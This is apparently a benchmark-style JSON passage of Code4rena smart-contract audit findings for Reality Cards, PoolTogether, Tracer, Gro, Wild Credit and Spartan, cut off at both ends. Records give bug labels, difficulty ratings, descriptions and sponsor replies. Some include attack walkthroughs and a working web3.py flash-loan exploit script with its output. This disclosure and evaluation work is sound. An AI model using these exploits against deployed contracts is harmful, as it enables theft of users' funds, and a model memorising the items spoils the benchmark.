\"That‚Äôs entirely my fault, and this is a scary one. We might be having a slightly different or impredictable curve in Pool.sol, and we might notice only after a long while with the Pools being slowly drained. We might never even have found this was the issue.I would suggest increasing the severity of this issue to High.\"\n    ],\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": null\n  },\n  {\n    \"row_number\": 20,\n    \"bug_id\": \" H-03\",\n    \"bug_label\": \" S5-3\",\n    \"difficulty\": 4,\n    \"bug_description\": \" \\\"anyone can call function sponsor\\\"\",\n    \"line\": \"RCMarket[817]\",\n    \"url\": \" https://code4rena.com/reports/2021-06-realitycards#h-03-anyone-can-call-function-sponsor\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted bypaulius.eth, also found by0xRajeev,cmichel, andshw\",\n      \"This functionsponsorshould only be called by the factory, however, it does not have any auth checks, so that means anyone can call it with an arbitrary_sponsorAddressaddress and transfer tokens from them if the allowance is > 0:\",\n      \"Recommend checking that the sender is a factory contract.\",\n      \"Splidge (Reality Cards) confirmed:\",\n      \"mcplums (Reality Cards) commented:\"\n    ],\n    \"code_blocks\": [\n      \"/// @notice ability to add liqudity to the pot without being able to win.\\n/// @dev called by Factory during market creation\\n/// @param _sponsorAddress the msgSender of createMarket in the Factory\\nfunction\\nsponsor\\n(\\naddress\\n_sponsorAddress\\n,\\nuint256\\n_amount\\n)\\nexternal\\noverride\\n{\\n_sponsor\\n(\\n_sponsorAddress\\n,\\n_amount\\n);\\n}\"\n    ],\n    \"quotes\": [\n      \"This is a good one!\",\n      \"Yeah this is massive one!! Thanks @pauliax :)\",\n      \"fixedhere\"\n    ],\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": null\n  },\n  {\n    \"row_number\": 21,\n    \"bug_id\": \" H-04\",\n    \"bug_label\": \" S5-1\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"Anyone can affect deposits of any user and turn the owner of the token\\\"\",\n    \"line\": \"RCTreasury[703]\",\n    \"url\": \" https://code4rena.com/reports/2021-06-realitycards#h-04-anyone-can-affect-deposits-of-any-user-and-turn-the-owner-of-the-token\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by [adlamo](https://twitter.com/a_delamo)_\",\n      \"OnRCTreasury, we have the methodcollectRentUser. This method is public, so anyone can call it using whatever user and whatever timestamp.\\nSo, calling this method usinguser = XXXXXand_timeToCollectTo = type(uint256).max), would makeisForeclosed[user] = true.\",\n      \"Seeissue pagefor referenced code\",\n      \"Now, we can do the same for all the users bidding for a specific token.\\nFinally, I can become the owner of the token by just callingnewRentaland using a small price.newRentalwill iterate over all the previous bid and will remove them because there are foreclosed.\",\n      \"Recommend thatcollectRentUsershould be private and create a new public method withonlyOrderbookmodifier.\",\n      \"Splidge (Reality Cards) confirmed:\",\n      \"mcplums (Reality Cards) commented:\"\n    ],\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": null\n  },\n  {\n    \"row_number\": 22,\n    \"bug_id\": \" H-01\",\n    \"bug_label\": \" S6-3\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"User could lose underlying tokens when redeeming from the IdleYieldSource\\\"\",\n    \"line\": \"IdleYieldSource[128,131]\",\n    \"url\": \" https://code4rena.com/reports/2021-06-pooltogether#h-01-user-could-lose-underlying-tokens-when-redeeming-from-the-idleyieldsource\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by shw\",\n      \"TheredeemTokenfunction inIdleYieldSourceusesredeemedShareinstead ofredeemAmountas the input parameter when callingredeemIdleTokenof the Idle yield source. As a result, users could get fewer underlying tokens than they should.\",\n      \"When burning users‚Äô shares, it is correct to useredeemedShare(line 130). However, when redeeming underlying tokens from Idle Finance,redeemAmountshould be used instead ofredeemedShare(line 131). Usually, thetokenPriceWithFee()is greater thanONE_IDLE_TOKEN, and thusredeemedShareis less thanredeemAmount, causing users to get fewer underlying tokens than expected.\",\n      \"Recommend changingredeemedSharetoredeemAmountat lineL131.\",\n      \"PierrickGT (PoolTogether) confirmed and patched:\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": [\"PR:https://github.com/pooltogether/idle-yield-source/pull/4\"],\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": null\n  },\n  {\n    \"row_number\": 23,\n    \"bug_id\": \" H-03\",\n    \"bug_label\": \" S6-3\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"BadgerYieldSource balanceOfToken share calculation seems wrong\\\"\",\n    \"line\": \"BadgerYieldSource[32,36]\",\n    \"url\": \" https://code4rena.com/reports/2021-06-pooltogether#h-03-badgeryieldsource-balanceoftoken-share-calculation-seems-wrong\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by cmichel\",\n      \"When suppling to theBadgerYieldSource, someamountofbadgeris deposited tobadgerSettand one receivesbadgerSettshare tokens in return which are stored in thebalancesmapping of the user. So far this is correct.\",\n      \"ThebalanceOfTokenfunction should then return the redeemable balance inbadgerfor the user‚ÄôsbadgerSettbalance.\\nIt computes it as the pro-rata share of the user balance (compared to the total-supply ofbadgerSett) on thebadgerin the vault:\",\n      \"However,badger.balanceOf(address(badgerSett))is only a small amount of badger that is deployed in the vault (‚ÄúSett‚Äù) due to most of the capital being deployed to thestrategies. Therefore, it under-reports the actual balance:\",\n      \"Any contract or user calling thebalanceOffunction will receive a value that is far lower than the actual balance.\\nUsing this value as a basis for computations will lead to further errors in the integrations.\",\n      \"Recommend usingbadgerSett.balance()instead ofbadger.balanceOf(address(badgerSett))to also account for ‚Äúthe balance in the Sett, the Controller, and the Strategy‚Äù.\",\n      \"asselstine (PoolTogether) confirmed\"\n    ],\n    \"code_blocks\": [\n      \"balances\\n[\\naddr\\n].\\nmul\\n(\\nbadger\\n.\\nbalanceOf\\n(\\naddress\\n(\\nbadgerSett\\n))\\n).\\ndiv\\n(\\nbadgerSett\\n.\\ntotalSupply\\n()\\n)\"\n    ],\n    \"quotes\": [\n      \"Typically, a Sett will keep a small portion of deposited funds in reserve to handle small withdrawals cheaply.Badger Docs\"\n    ],\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": null\n  },\n  {\n    \"row_number\": 24,\n    \"bug_id\": \" H-04\",\n    \"bug_label\": \" S3-2\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"withdraw timelock can be circumvented\\\"\",\n    \"line\": \"PrizePool[371,398]\",\n    \"url\": \" https://code4rena.com/reports/2021-06-pooltogether#h-04-withdraw-timelock-can-be-circumvented\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by cmichel\",\n      \"One can withdraw the entirePrizePooldeposit by circumventing the timelock.\\nAssume the user has no credits for ease of computation:\",\n      \"user callswithdrawWithTimelockFrom(user, amount=userBalance)with their entire balance. This ‚Äúmints‚Äù an equivalentamountoftimelockand resets_unlockTimestamps[user] = timestamp = blockTime + lockDuration.\",\n      \"user callswithdrawWithTimelockFrom(user, amount=0)again but this time withdrawing0amount. This will return alockDurationof0and thusunlockTimestamp = blockTime. The inner_mintTimelocknow resets_unlockTimestamps[user] = unlockTimestamp\",\n      \"Asif (timestamp <= _currentTime())is true, the full users amount is now transferred out to the user in the_sweepTimelockBalancescall.\",\n      \"Users don‚Äôt need to wait for their deposit to contribute their fair share to the prize pool.\\nThey can join before the awards and leave right after without a penalty which leads to significant issues for the protocol.\\nIt‚Äôs the superior strategy but it leads to no investments in the strategy to earn the actual interest.\",\n      \"Recommend that the unlock timestamp should be increased by duration each time, instead of being reset to the duration.\",\n      \"asselstine (PoolTogether) confirmed:\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": [\n      \"Mitigation:If a user‚Äôs timelock balance is non-zero, the prize strategy rejects the ticket burn.\"\n    ],\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": null\n  },\n  {\n    \"row_number\": 25,\n    \"bug_id\": \" H-01\",\n    \"bug_label\": \" S1-3\",\n    \"difficulty\": 2,\n    \"bug_description\": \" \\\"Wrong trading pricing calculations\\\"\",\n    \"line\": \"Pricing[69],Trader[67]\",\n    \"url\": \" https://code4rena.com/reports/2021-06-tracer#h-01-wrong-trading-pricing-calculations\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by 0xsanson, also found by shw\",\n      \"In thePricingcontract, an agent can manipulate the trading prices by spamming a high amount of trades.\",\n      \"Indeed an agent can create a high amount of orders at an arbitrary price and with a near-zero amount (so the agent doesn‚Äôt even need large funds); next he/she pairs the orders with another account and callsTrader.executeTrade; now every order calls aPricing.recordTradeusing the arbitrary price set by the agent.\",\n      \"Since the trades are all made in the same hour, by the wayhourlyTracerPrices[currentHour]is calculated, it skews the average price towards the price set by the agent. This arbitrary value is used to calculate thefundingRatesand thefairPrice, allowing a malicious agent the ability to manipulate the market.\",\n      \"Recommend passing thefillAmountparameter torecordTrade(...), and calculatehourlyTracerPrices[currentHour].tradessummingfillAmountinstead of 1 every trade.\",\n      \"raymogg (Tracer) confirmed:\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": [\n      \"Issue is valid, and there appear to be a few other issues that reference similar problems.The Trader contract will have a whitelist allowing only select relayers to push orders on chain. As long as off chain order books have sufficient liquidity, this issue is then mitigated as users can‚Äôt just arbitrarily match orders and send them in, they must be matched on a book with liquidity. To alter the price you would then need to eat through significant liquidity (increasing the cost of this attack).\"\n    ],\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": null\n  },\n  {\n    \"row_number\": 26,\n    \"bug_id\": \" H-02\",\n    \"bug_label\": \" S6-3\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"Use of incorrect index leads to incorrect updation of funding rates\\\"\",\n    \"line\": \"Pricing[141,155,159]\",\n    \"url\": \" https://code4rena.com/reports/2021-06-tracer#h-02-use-of-incorrect-index-leads-to-incorrect-updation-of-funding-rates\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by 0xRajeev\",\n      \"TheupdateFundingRate()function updates the funding rate and insurance funding rate. While the instant/new funding rates are calculated correctly, the cumulative funding rate calculation is incorrect because it is always adding the instant to 0, not the previous value. This is due to the use of[currentFundingIndex]which has been updated since the previous call to this function while it should really be using[currentFundingIndex-1]to reference the previous funding rate.\",\n      \"The impact of this, is that the cumulative funding rate and insurance funding rates are calculated incorrectly without considering the correct previous values. This affects the settling of accounts across the entire protocol. The protocol logic is significantly impacted, accounts will not be settled as expected, protocol shutdown and contracts will need to be redeployed. Users may lose funds and the protocol takes a reputation hit.\",\n      \"Recommend using[currentFundingIndex-1]for non-zero values ofcurrentFundingIndexto get the value updated in the previous call on lines L155 and L159 ofPricing.sol.\",\n      \"raymogg (Tracer) confirmed:\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": [\"Confirmed as an index issue with funding rate üëç\"],\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": null\n  },\n  {\n    \"row_number\": 27,\n    \"bug_id\": \" H-04\",\n    \"bug_label\": \" S6-4\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"Logic error in fee subtraction\\\"\",\n    \"line\": \"TracerPerpetualSwaps[272], LibBalances[172]\",\n    \"url\": \" https://code4rena.com/reports/2021-06-tracer#h-04-logic-error-in-fee-subtraction\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by 0xsanson\",\n      \"InLibBalances.applyTrade(), we need to collect a fee from the trade. However, the current code subtracts a fee from the short position and adds it to the long. The correct implementation is to subtract a fee to both (seeTracerPerpetualSwaps.solL272).\\nThis issue causes withdrawals problems, since Tracer thinks it can withdraw the collect fees, leaving the users with an incorrect amount of quote tokens.\",\n      \"Recommend changing+feeto-feein thehighlighted line.\",\n      \"raymogg (Tracer) confirmed:\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": [\"Valid issue üëç\"],\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": null\n  },\n  {\n    \"row_number\": 28,\n    \"bug_id\": \" H-06\",\n    \"bug_label\": \" S6-4\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"Wrong price scale for GasOracle\\\"\",\n    \"line\": \"ChainlinkOracleAdapter[33]\",\n    \"url\": \" https://code4rena.com/reports/2021-06-tracer#h-06-wrong-price-scale-for-gasoracle\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by cmichel\",\n      \"TheGasOracleuses two chainlink oracles (GAS in ETH with some decimals, USD per ETH with some decimals) and multiplies their raw return values to get the gas price in USD.\",\n      \"However, the scaling depends on the underlying decimals of the two oracles and could be anything.\\nBut the code assumes it‚Äôs in 18 decimals.\",\n      \"There is atoWadfunction that seems to involve scaling but it is never used.\",\n      \"The impact is that, If the scale is wrong, the gas price can be heavily inflated or under-reported.\",\n      \"Recommend checkingchainlink.decimals()to know the decimals of the oracle answers and scale the answers to 18 decimals such that no matter the decimals of the underlying oracles, thelatestAnswerfunction always returns the answer in 18 decimals.\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": [\n      \"‚ÄúReturned value is USD/Gas * 10^18 for compatibility with rest of calculations‚Äù\",\n      \"Disagree with severity as while the statement that the underlying decimals of the oracles could be anything, we will be using production Chainlink feeds for which the decimals are known at the time of deploy.This is still however an issue as you don‚Äôt want someone using different oracles (eg non Chainlink) that have different underlying decimals and not realising that this contract will not support that.\",\n      \"Marking this a high-risk issue as it poses a big threat to users deploying their own markets\"\n    ],\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": null\n  },\n  {\n    \"row_number\": 29,\n    \"bug_id\": \" H-02\",\n    \"bug_label\": \" S6-4\",\n    \"difficulty\": 2,\n    \"bug_description\": \" \\\"Buoy3Pool.safetyCheck is not precise and has some assumptions\\\"\",\n    \"line\": \"Buoy3Pool[87]\",\n    \"url\": \" https://code4rena.com/reports/2021-06-gro#h-02-buoy3poolsafetycheck-is-not-precise-and-has-some-assumptions\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by cmichel, also found by shw\",\n      \"ThesafetyCheckfunction has several issues that impact how precise the checks are:\",\n      \"Only checks if thea/banda/cratios are withinBASIS_POINTS.\\nBy transitivity,b/cis only within2 * BASIS_POINTSifa/banda/care in range.\\nFor a more precise check whether both USDC and USDT are within range,b/cmust be checked as well.\",\n      \"Ifa/bis within range, this does not imply thatb/ais within range.\",\n      \"‚Äúinverted ratios, a/b bs b/a, while producing different results should both reflect the same change in any one of the two underlying assets, but in opposite directions‚Äù\",\n      \"Example:lastRatio = 1.0ratio: a = 1.0, b = 0.8=>a/b = 1.25,b/a = 0.8Ifa/bwas used with a 20% range, it‚Äôd be out of range, butb/ais in range.\",\n      \"The NatSpec for the function states that it checks Curve and an external oracle, but no external oracle calls are checked, both_ratioandlastRatioare only from Curve. Only_updateRatioschecks the oracle.\",\n      \"To address this issue, it is recommended to check ifb/cis withinBASIS_POINTS.\",\n      \"kristian-gro (Gro) confirmed but disagreed with severity:\",\n      \"kristian-gro (Gro) commented:\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": [\n      \"Makes strong assumption about the range of possible values - small differences between a and b will result in small differences between a/b and b/a - Extreme cases are handled by emergency. Agree on b/c check\",\n      \"medium severity - will only cause stop of deposits/withdrawals against curve, work around to put in emergency mode\",\n      \"Acknowledged, but the differences between variables are in basis points, we‚Äôve simulated flash loan manipulations of curve and come to the conclusion that this approximation has a sufficiently small error margin to not cause issues.\\nThe B/C check (usdc/usdt) has been added in release version.\",\n      \"A possibility of stopping deposits or withdrawals deserves high risk.\"\n    ],\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": null\n  },\n  {\n    \"row_number\": 30,\n    \"bug_id\": \" H-03\",\n    \"bug_label\": \" S5-3\",\n    \"difficulty\": 3,\n    \"bug_description\": \" \\\"Incorrect use of operator leads to arbitrary minting of GVT tokens\\\"\",\n    \"line\": \"Controller[357,405]\",\n    \"url\": \" https://code4rena.com/reports/2021-06-gro#h-03-incorrect-use-of-operator-leads-to-arbitrary-minting-of-gvt-tokens\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by 0xRajeev, also found by pauliax and gpersoon\",\n      \"ThedistributeStrategyGainLoss()function distributes any gains or losses generated from a harvest and is expected to be called only by valid protocol vault adaptors. It is an externally visible function and the access control is indirectly enforced onmsg.senderby checking thatvaultIndexes[msg.sender]is a valid index range 1-4. However, the operator used in therequire()is||instead of&&, which allows an arbitrarymsg.sender, i.e. attacker, to bypass the check.\",\n      \"Scenario: An arbitrary non-vault address calling this function will get an index of 0 because of default mapping value invaultIndexes[msg.sender], which will fail the> 0check, but pass the<= N_COINS + 1check (N_COINS = 3) because0 <= 4which will allow control to go past this check.\",\n      \"Furthermore, on L362,index=0will underflow the -1 decrement (due to lack ofSafeMath.suband use of < 0.8.0 solc) and the index will be set to(uint256_MAX - 1). This will allow execution to proceed to the ‚Äúelse‚Äù part of conditional meant for curve LP vault. Therefore, this will allow any random address to call this function with arbitrary values of gain/loss and distribute arbitrary gain/loss appearing to come from Curve vault.\",\n      \"The attack control flow:\",\n      \"->Controller.distributeStrategyGainLoss(ARBITRARY_HIGH_VALUE_OF_GAIN, 0)\",\n      \"->index = 0passes check for theindex <= N_COINS + 1part of predicate on L357 inController.sol\",\n      \"->index = uint256_MAXafter L362\",\n      \"->gainUsd = ibuoy.lpToUsd(ARBITRARY_HIGH_VALUE_OF_GAIN);on L371 inController.sol\",\n      \"->ipnl.distributeStrategyGainLoss(gainUsd, lossUsd, reward);on L376 inController.sol\",\n      \"->(gvtAssets, pwrdAssets, performanceBonus) = handleInvestGain(lastGA, lastPA, gain, reward);on L254 inPnL.sol\",\n      \"->performanceBonus = profit.mul(performanceFee).div(PERCENTAGE_DECIMAL_FACTOR);on L186 ofPnL.sol\",\n      \"->gvt.mint(reward, gvt.factor(gvtAssets), performanceBonus);on L256 inPnL.sol\",\n      \"Recommend changing||to&&inrequire()on L357 ofController.solto prevent arbitrary addresses from going past this check. Or, consider exercising explicit access control for the authorized vault adaptors.\",\n      \"kristian-gro (Gro) confirmed\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": [\"Confirmed and Fix has been implemented in release version.\"],\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": null\n  },\n  {\n    \"row_number\": 31,\n    \"bug_id\": \" H-01\",\n    \"bug_label\": \" S6-1\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"Reward computation is wrong\\\"\",\n    \"line\": \"LendingPair[187]\",\n    \"url\": \" https://code4rena.com/reports/2021-07-wildcredit#h-01-reward-computation-is-wrong\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by cmichel\",\n      \"TheLendingPair.accrueAccountfunction distributes rewardsbeforeupdating the cumulative supply / borrow indexes as well as the index + balance for the user (by minting supply tokens / debt).\\nThis means the percentage of the user‚Äôs balance to the total is not correct as the total can be updated several times in between.\",\n      \"Example: Two users deposit the same amounts in the same block. Thus, after some time they should receive the same tokens.\",\n      \"User A and B deposit 1000 tokens (in the same block) and are minted 1000 tokens in return. Total supply =2000\",\n      \"Assume after 50,000 blocks,AcallsaccrueAccount(A)which first calls_distributeReward. A is paid out 1000/2000 = 50% of the 50,000 blocks reward since deposit. Afterwards,accrue+_accrueAccountInterest(A)is called andAis minted 200 more tokens due to supplier lending rate. The supplytotalSupply is now 2200.\",\n      \"After another 50,000 blocks,AcallsaccrueAccount(A)again. which first calls_distributeReward. A is paid out 1200/2200 =54.5454% of the 50,000 blocks reward since deposit.\",\n      \"From here, you can already see thatAreceives more than 50% of the 100,000 block rewards although they deposited at the same time asBand didn‚Äôt deposit or withdraw any funds.Bwill receive~1000/2200 = 45%(ignoring any new LP supply tokens minted forA‚Äôs second claim.)\",\n      \"The impact is that wrong rewards will be minted users which do not represent their real fair share. Usually, users will get fewer rewards than they should receive, as their individual interest was not updated yet, but the totals (total debt and total supply) could have been updated by other accounts in between.\",\n      \"There are two issues that both contribute to it:\",\n      \"total LP supply and total debt must be updated by thetotal new interestwhenaccrueis called, not only increased by anindividual user‚Äôs interest. See my other issue ‚ÄúReward computation is wrong‚Äù that goes into more depth\",\n      \"Lending/borrow accrual must happen before reward distribution\",\n      \"talegift (Wild Credit) acknowledged but disagreed with severity:\",\n      \"ghoul-sol (Judge) commented:\"\n    ],\n    \"code_blocks\": [\n      \"function\\naccrueAccount\\n(\\naddress\\n_account\\n)\\npublic\\n{\\n// distributes before updating accrual state\\n_distributeReward\\n(\\n_account\\n);\\naccrue\\n();\\n_accrueAccountInterest\\n(\\n_account\\n);\\nif\\n(\\n_account\\n!=\\nfeeRecipient\\n()) {\\n_accrueAccountInterest\\n(\\nfeeRecipient\\n());\\n}\\n}\"\n    ],\n    \"quotes\": [\n      \"Assets not at direct risk, but the function of the protocol or its availability could be impacted, orleak valuewith a hypothetical attack path with stated assumptions, butexternal requirements.Update to severity - 2\",\n      \"Disagree with sponsor about severity, this is significant accounting error.\"\n    ],\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": null\n  },\n  {\n    \"row_number\": 32,\n    \"bug_id\": \" H-02\",\n    \"bug_label\": \" S3-1\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"LendingPair.liquidateAccount does not accrue and update cumulativeInterestRate\\\"\",\n    \"line\": \"LendingPair[246]\",\n    \"url\": \" https://code4rena.com/reports/2021-07-wildcredit#h-02-lendingpairliquidateaccount-does-not-accrue-and-update-cumulativeinterestrate\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by cmichel\",\n      \"TheLendingPair.liquidateAccountfunction does not accrue and update thecumulativeInterestRatefirst, it only calls_accrueAccountInterestwhich does not update and instead uses the oldcumulativeInterestRate.\",\n      \"The liquidatee (borrower)‚Äòs state will not be up-to-date.\\nI could skip some interest payments by liquidating myself instead of repaying if I‚Äôm under-water.\\nAs the market interest index is not accrued, the borrower does not need to pay any interest accrued from the time of the last accrual until now.\",\n      \"Recommend callingaccrueAccountinstead of_accrueAccountInterest\",\n      \"talegift (Wild Credit) confirmed but disagreed with severity:\",\n      \"ghoul-sol (Judge) commented:\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": [\n      \"Assets not at direct risk, but the function of the protocol or its availability could be impacted, orleak valuewith a hypothetical attack path with stated assumptions, butexternal requirements.Update to severity - 2\",\n      \"No funds are lost however a user can steal ‚Äúunpaid interest‚Äù from the protocol. Keeping high risk.\"\n    ],\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": null\n  },\n  {\n    \"row_number\": 35,\n    \"bug_id\": \" H-05\",\n    \"bug_label\": \" S1-1\",\n    \"difficulty\": 2,\n    \"bug_description\": \" \\\"Synth realise is vulnerable to flash loan attacks\\\"\",\n    \"line\": \"Synth[187]\",\n    \"url\": \" https://code4rena.com/reports/2021-07-spartan#h-05-synth-realise-is-vulnerable-to-flash-loan-attacks\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by jonah1005, also found by adelamo_\",\n      \"Synthrealisefunction calculatesbaseValueLPandbaseValueSynthbase on AMM spot price which is vulnerable to flash loan attack.Synth‚Äôs lp is subject torealisewhenever the AMM ratio is different than Synth‚Äôs debt ratio.\",\n      \"The attack does not necessarily require a flash loan. A big whale of the lp token holders could keep callingrealiseby shifting token ratio of AMM pool back and forth.\",\n      \"The vulnerability is located atSynth.solL187-L199. Where the formulahereis dangerous.\",\n      \"Here‚Äôs a script for conducting flashloan attack:\",\n      \"Output:\",\n      \"Calculating Lp token‚Äôs value base on AMM protocol is known to be dangerous.\\nThere are a few steps that might solve the issue:\",\n      \"calculate token‚Äôs price from a reliable source.  Implement a TWAP oracle or uses chainlink oracle.\",\n      \"calculate lp token value based on anti-flashloan formula.  Alpha finance‚Äôs formula is a good reference:https://blog.alphafinance.io/fair-lp-token-pricing\",\n      \"verifyfirst (Spartan) confirmed and disagreed with severity:\"\n    ],\n    \"code_blocks\": [\n      \"flashloan_amount = init_amount\\nuser = w3.eth.accounts[\\n0\\n]\\nmarked_token.functions.transfer(user, flashloan_amount).transact()\\nmarked_token.functions.transfer(token_pool.address, flashloan_amount).transact({\\n'from'\\n: user})\\ntoken_pool.functions.addForMember(user).transact({\\n'from'\\n: user})\\nreceived_lp = token_pool.functions.balanceOf(user).call()\\nsynth_balance_before_realise = token_synth.functions.mapSynth_LPBalance(token_pool.address).call()\\ntoken_synth.functions.realise(token_pool.address).transact()\\ntoken_pool.functions.transfer(token_pool.address, received_lp).transact({\\n'from'\\n: user})\\ntoken_pool.functions.removeForMember(user).transact({\\n'from'\\n: user})\\ntoken_synth.functions.realise(token_pool.address).transact()\\nsynth_balance_after_realise = token_synth.functions.mapSynth_LPBalance(token_pool.address).call()\\nprint\\n(\\n'synth_lp_balance_after_realise'\\n, synth_balance_after_realise)\\nprint\\n(\\n'synth_lp_balance_before_realise'\\n, synth_balance_before_realise)\",\n      \"synth_balance_after_realise 1317859964829313908162\\nsynth_balance_before_realise 2063953488372093023256\"\n    ],\n    \"quotes\": [\n      \"A proposal has been suggested to limit the use of realise() for a DAO proposal. This will allow only liquidity providers to choose the outcome of a function that directly affects them.\"\n    ],\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": null\n  },\n  {\n    \"row_number\": 36,\n    \"bug_id\": \" H-06\",\n    \"bug_label\": \" S1-1\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"SynthVault rewards can be gamed\\\"\",\n    \"line\": \"BondVault[60], Dao[250], synthVault[91,95]\",\n    \"url\": \" https://code4rena.com/reports/2021-07-spartan#h-06-synthvault-rewards-can-be-gamed\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by cmichel\",\n      \"TheSynthVault._depositfunction addsweightfor the user that depends on the spot value of the deposit synth amount inBASE.\",\n      \"This spot price can be manipulated and the cost of manipulation is relative to the pool‚Äôs liquidity.\\nHowever, the reward (seecalcReward) is measured in BASE tokens unrelated to the pool.\\nTherefore, if the pool‚Äôs liquidity is low and the reward reserve is high, the attack can be profitable:\",\n      \"Manipulate the pool spot price of theiSYNTH(_synth).LayerONE()pool by dripping a lot ofBASEinto it repeatedly (sending lots of smaller trades is less costly due to thepath-independence of the continuous liquidity model). This increases theBASEpertokenprice.\",\n      \"CallSynthVault.depositForMemberand deposit asmallamount of synth token. TheiUTILS(_DAO().UTILS()).calcSpotValueInBase(iSYNTH(_synth).LayerONE(), _amount)will return an inflated weight due to the price.\",\n      \"Optionally drip moreBASEinto the pool and repeat the deposits\",\n      \"Drip backtokento the pool to rebalance it\",\n      \"The user‚Äôsweightis now inflated compared to the deposited / locked-up amount and they can claim a large share of the rewards. The cost of the attack depends on the pool‚Äôs liquidity and the profit depends on the reserve. It could therefore be profitable under certain circumstances.\",\n      \"Recommend tracking a TWAP price of the synth instead, store the deposited synths instead, and compute the weight & total weight on the fly based on the TWAP * deposit amount instead of at the time of deposit.\",\n      \"verifyfirst (Spartan) acknowledged:\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": [\n      \"There is already a discussion in place to change spot rate to swap rate calculation for weights.\"\n    ],\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": null\n  },\n  {\n    \"row_number\": 37,\n    \"bug_id\": \" H-07\",\n    \"bug_label\": \" S1-2\",\n    \"difficulty\": 2,\n    \"bug_description\": \" \\\"Missing slippage checks\\\"\",\n    \"line\": \"Pool[284,296]\",\n    \"url\": \" https://code4rena.com/reports/2021-07-spartan#h-07-missing-slippage-checks\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by cmichel, also found by tensors\",\n      \"There are no minimum amounts out, or checks that frontrunning/slippage is sufficiently mitigated.\\nThis means that anyone with enough capital can force arbitrarily large slippage by sandwiching transactions, close to 100%. See issue page for referenced code.\",\n      \"Recommend adding a minimum amount out parameter. The function reverts if the minimum amount isn‚Äôt obtained.\",\n      \"verifyfirst (Spartan) acknowledge:\",\n      \"SamusEldburg (Spartan) confirmed and disagreed with severity:\",\n      \"ghoul-sol (Judge) commented:\"\n    ],\n    \"code_blocks\": null,\n    \"quotes\": [\n      \"We acknowledge the issue for the protocol‚Äôs AMM, but if this becomes a large issue in the future, the router is easily upgradeable to include a minimum rate parameter.\",\n      \"Have changed this to confirmed; even though we already were aware of it; we have discussed and are happy to add in a UI-handed arg for minAmount now rather than reactively in the future. Disagree with severity though; this wasn‚Äôt a problem with V1 at all.\",\n      \"I‚Äôll keep high risk as sandwich attacks are very common and risk of getting a bad swap is real.\"\n    ],\n    \"proof_of_concept\": null,\n    \"recommended_mitigation\": null\n  },\n  {\n    \"row_number\": 38,\n    \"bug_id\": \" H-09\",\n    \"bug_label\": \" S2-2\",\n    \"difficulty\": 1,\n    \"bug_description\": \" \\\"arbitrary synth mint/burn from pool\\\"\",\n    \"line\": \"Pool[229],Synth[165]\",\n    \"url\": \" https://code4rena.com/reports/2021-07-spartan#h-09-arbitrary-synth-mintburn-from-pool\",\n    \"title\": \"\",\n    \"main_content\": [\n      \"Submitted by jonah1005\",\n      \"Poolcan mint arbitrarySynthprovided as long as it‚Äôs a valid synth. When there are multiple curated pools and synth (which the protocol is designed for), hackers can mint expensive synthetics from a cheaper AMM pool. The hacker can burn the minted synth at the expensive pool and get profit. The arbitrage profit can be amplified with flash loan services and break all the pegs.\",\n      \"Pool‚Äôs mintSynth logic,Synth‚Äôs mintSynth logic, andSynth‚Äôs authorization logic.\",\n      \"The price of the synthetics to be mint is calculated inPoolbased on the AMM price of the current Pool\",\n      \"Here‚Äôs a web3.py script of minting arbitrarySynthin a pool.\\nFor simplicity, two pools are set with the assumption that link is 10x expensive than dai.\",\n      \"The log of the above script\",\n      \"Recommend Checking the provided synth‚Äôs underlying token inmintSynth\",\n      \"verifyfirst (Spartan) confirmed:\"\n    ],\n    \"code_blocks\": [\n      \"sparta_amount =\\n100\\n*\\n10\\n**\\n18\\ninitail_link_synth = 